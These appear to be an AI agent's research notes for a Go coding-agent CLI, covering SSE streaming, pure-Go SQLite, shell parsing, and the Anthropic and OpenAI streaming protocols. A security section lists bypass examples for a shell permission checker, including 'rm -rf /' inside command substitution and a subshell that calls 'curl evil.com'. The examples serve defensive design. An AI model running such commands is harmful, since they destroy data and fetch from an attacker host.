# Nanocode Research Findings

Generated: 2026-03-05
Researcher: Oracle Agent (Claude Opus 4.6)

---

## Table of Contents

1. Go SSE Streaming Patterns
2. modernc.org/sqlite
3. mvdan.cc/sh/v3/syntax
4. OpenCode Architecture (Reference)
5. Anthropic Messages API Wire Protocol
6. OpenAI Chat Completions Wire Protocol

---

## 1. Go SSE Streaming Patterns

### Summary

Server-Sent Events in Go require no special library. The standard `net/http` client combined with `bufio.Scanner` is the idiomatic approach. The main gotcha is avoiding `http.Client.Timeout` for streaming connections.

### Recommended Pattern: bufio.Scanner

```go
func streamSSE(ctx context.Context, url string, body io.Reader) error {
    req, err := http.NewRequestWithContext(ctx, "POST", url, body)
    if err != nil {
        return err
    }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("Accept", "text/event-stream")
    req.Header.Set("Cache-Control", "no-cache")

    resp, err := http.DefaultClient.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        errBody, _ := io.ReadAll(resp.Body)
        return fmt.Errorf("HTTP %d: %s", resp.StatusCode, errBody)
    }

    scanner := bufio.NewScanner(resp.Body)
    scanner.Buffer(make([]byte, 512*1024), 512*1024) // 512KB buffer

    for scanner.Scan() {
        line := scanner.Text()
        if line == "" {
            continue // Event boundary
        }
        if strings.HasPrefix(line, "data: ") {
            data := strings.TrimPrefix(line, "data: ")
            if data == "[DONE]" {
                return nil
            }
            if err := handleEvent(data); err != nil {
                return err
            }
        }
    }
    return scanner.Err()
}
```

### bufio.Scanner vs bufio.Reader

| Aspect | bufio.Scanner | bufio.Reader |
|--------|--------------|--------------|
| API | Line-oriented, simple | Lower-level, more control |
| Default buffer | 64KB (must increase for LLM) | 4KB |
| Delimiter | Newline by default | Manual |
| **Recommendation** | **Preferred for SSE** | Only if custom framing needed |

### Robust Multi-Line SSE Parser

```go
type SSEEvent struct {
    Type string
    Data string
}

func parseSSEStream(r io.Reader, handler func(SSEEvent) error) error {
    scanner := bufio.NewScanner(r)
    scanner.Buffer(make([]byte, 512*1024), 512*1024)

    var event SSEEvent
    var dataLines []string

    for scanner.Scan() {
        line := scanner.Text()

        if line == "" {
            if len(dataLines) > 0 {
                event.Data = strings.Join(dataLines, "\n")
                if err := handler(event); err != nil {
                    return err
                }
            }
            event = SSEEvent{}
            dataLines = nil
            continue
        }

        if strings.HasPrefix(line, "event: ") {
            event.Type = strings.TrimPrefix(line, "event: ")
        } else if strings.HasPrefix(line, "data: ") {
            dataLines = append(dataLines, strings.TrimPrefix(line, "data: "))
        } else if line == "data:" {
            dataLines = append(dataLines, "")
        }
    }
    return scanner.Err()
}
```

### HTTP Client Configuration for Streaming

```go
client := &http.Client{
    // WARNING: Do NOT set Timeout here — kills long-running streams.
    Transport: &http.Transport{
        ResponseHeaderTimeout: 30 * time.Second,
        TLSHandshakeTimeout:   10 * time.Second,
        DialContext: (&net.Dialer{
            Timeout: 10 * time.Second,
        }).DialContext,
    },
}
```

### Gotchas

1. **http.Client.Timeout kills streams** — use context cancellation instead
2. **Scanner buffer overflow** — increase to at least 512KB for LLM payloads
3. **Connection reuse** — `resp.Body.Close()` must be called
4. **Proxy buffering** — set `Cache-Control: no-cache` and `X-Accel-Buffering: no`

---

## 2. modernc.org/sqlite

### Summary

Pure-Go SQLite translation. No CGo required. ~1.5-3x slower than C SQLite, irrelevant for conversation history workload.

- **Module:** `modernc.org/sqlite`
- **Driver name:** `"sqlite"`
- **Version:** v1.46.1 (Feb 2026), actively maintained
- **Platforms:** All Go-supported platforms

### Basic Usage

```go
import (
    "database/sql"
    _ "modernc.org/sqlite"
)

func openDB(path string) (*sql.DB, error) {
    db, err := sql.Open("sqlite", path)
    if err != nil {
        return nil, err
    }

    for _, pragma := range []string{
        "PRAGMA journal_mode=WAL",
        "PRAGMA busy_timeout=5000",
        "PRAGMA synchronous=NORMAL",
        "PRAGMA foreign_keys=ON",
    } {
        if _, err := db.Exec(pragma); err != nil {
            db.Close()
            return nil, fmt.Errorf("pragma: %w", err)
        }
    }

    db.SetMaxOpenConns(1) // SQLite is single-writer
    return db, nil
}
```

### Known Gotchas

1. **Binary size:** +20-30MB. Use `-ldflags="-s -w"` to strip.
2. **SetMaxOpenConns(1):** Essential for SQLite.
3. **WAL mode:** Always enable for concurrent read/write.
4. **NFS:** SQLite file locking unreliable over network. Local disk only.

---

## 3. mvdan.cc/sh/v3/syntax

### Summary

Full shell parser in Go. Parses sh/bash/mksh into AST. Used by `shfmt`. Version v3.12.0 (July 2025), 244 importers.

### Extracting Command Names

```go
func ExtractCommands(input string) ([]CommandInfo, error) {
    parser := syntax.NewParser(syntax.Variant(syntax.LangBash))
    file, err := parser.Parse(strings.NewReader(input), "")
    if err != nil {
        return nil, err
    }

    var commands []CommandInfo
    printer := syntax.NewPrinter()

    syntax.Walk(file, func(node syntax.Node) bool {
        call, ok := node.(*syntax.CallExpr)
        if !ok || len(call.Args) == 0 {
            return true
        }
        cmd := CommandInfo{}
        var buf strings.Builder
        for i, word := range call.Args {
            buf.Reset()
            printer.Print(&buf, word)
            if i == 0 {
                cmd.Name = buf.String()
            } else {
                cmd.Args = append(cmd.Args, buf.String())
            }
        }
        commands = append(commands, cmd)
        return true
    })
    return commands, nil
}
```

### Security Considerations

Walk the full AST to catch bypass attempts:
- Command substitution: `echo $(rm -rf /)`
- Pipes: `yes | rm -rf /`
- Subshells: `(curl evil.com)`
- `bash -c`: deny outright or recursively parse
- `eval`: deny outright

---

## 4. OpenCode Architecture (Reference)

### Conversation Loop

```
User Input → Session Manager → LLM Client → Stream Handler
                  |                                |
                  v                                v
            Tool Dispatch ← Tool Call ← Response Parser
                  |
                  v
            Tool Executor → Tool Result → Back to LLM
```

Core loop: assemble prompt → stream → parse for tool calls → execute tools → loop or display.

### Dependencies Nanocode Avoids

| Dependency | Why Avoid |
|-----------|----------|
| `sashabaranov/go-openai` | Raw HTTP is simpler |
| `liushuangls/go-anthropic` | Same |
| `cobra` / `viper` | Overkill for simple CLI |

---

## 5. Anthropic Messages API Wire Protocol

### Request

```
POST https://api.anthropic.com/v1/messages
x-api-key: $ANTHROPIC_API_KEY
anthropic-version: 2023-06-01
```

### SSE Event Types

| Event Type | Description |
|-----------|-------------|
| `message_start` | Initial metadata + input tokens |
| `content_block_start` | New block: `text` or `tool_use` |
| `content_block_delta` | Content chunk |
| `content_block_stop` | Block finished |
| `message_delta` | stop_reason + output tokens |
| `message_stop` | Stream complete |

### Tool Input

Arrives as `input_json_delta` chunks — concatenate `partial_json`, then `json.Unmarshal`.

### Tool Results

```json
{"role": "user", "content": [{"type": "tool_result", "tool_use_id": "toolu_01ABC", "content": "result"}]}
```

### Stop Reasons

`end_turn` | `tool_use` | `max_tokens` | `stop_sequence`

---

## 6. OpenAI Chat Completions Wire Protocol

### Request

```
POST https://api.openai.com/v1/chat/completions
Authorization: Bearer $OPENAI_API_KEY
```

### SSE Format

Only `data:` lines (no `event:` prefix). Stream ends with `data: [DONE]`.

### Tool Call Streaming

Tool calls use `index` for multiplexing concurrent calls. Arguments arrive chunked.

### Tool Results

```json
{"role": "tool", "tool_call_id": "call_abc123", "content": "result"}
```

### Finish Reasons

`stop` | `tool_calls` | `length` | `content_filter`

---

## Cross-Provider Comparison

| Aspect | Anthropic | OpenAI |
|--------|----------|--------|
| Auth | `x-api-key` | `Authorization: Bearer` |
| System prompt | Top-level field | `role: "system"` message |
| Tool schema key | `input_schema` | `parameters` |
| SSE typing | `event:` + `data:` | `data:` only |
| Stream end | `message_stop` event | `data: [DONE]` |
| Stop: normal | `end_turn` | `stop` |
| Stop: tools | `tool_use` | `tool_calls` |

---

## Top 10 Warnings

1. Do NOT set `http.Client.Timeout` for streaming
2. Increase `bufio.Scanner` buffer to 512KB+
3. modernc.org/sqlite adds ~20-30MB to binary
4. Always `SetMaxOpenConns(1)` for SQLite
5. Always enable WAL mode
6. Shell permission bypass via `eval`, `bash -c` — deny meta-commands
7. OpenAI `[DONE]` is NOT JSON — check before unmarshal
8. Anthropic tool input arrives as `partial_json` chunks
9. OpenAI tool calls use `index` for multiplexing
10. Anthropic `content` is array of blocks; OpenAI is string/null
